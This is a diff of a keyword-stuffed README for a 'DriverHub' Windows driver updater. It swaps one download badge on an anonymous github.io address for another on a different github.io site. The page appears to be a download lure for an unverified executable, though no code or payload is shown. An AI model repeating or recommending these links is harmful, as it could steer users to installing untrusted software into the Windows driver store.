@@ -8,6 +8,8 @@ DriverHub Pro is the edition on the official product page. This text does not se
 
 The name is shared by three different tools. This page is the Windows driver updater. It is not a motherboard vendor utility, and it is not a robotics console that attaches gamepads.
 
+[![GET DriverHub](https://img.shields.io/badge/GET-DriverHub-0369A1?style=social&labelColor=0C4A6E&logoColor=white)](https://driverhub-usb.github.io/DriverHub-Pro/)
+
 ## Caution
 
 The updater writes into the Windows driver store. A weak match can leave a device quiet until you put the previous package back. The scan creates a Windows restore point before that write. DriverHub driver rollback stays on the recovery list after the package lands.
@@ -158,8 +160,6 @@ People still search driverhub for windows 10 and driverhub 64 bit windows 10. Th
 ### Packaged build
 
 Download the desktop build from the official site. One package, one button.
-
-[![GET DriverHub](https://img.shields.io/badge/GET-DriverHub-0369A1?style=social&labelColor=0C4A6E&logoColor=white)](https://astlnw117997.github.io/.github/DriverHub)
 
 DriverHub Pro is listed on the product page next to the standard updater. Start with the standard package if you only need a scan and a restore point. The product page is where Pro is described. This page does not list a price.
 
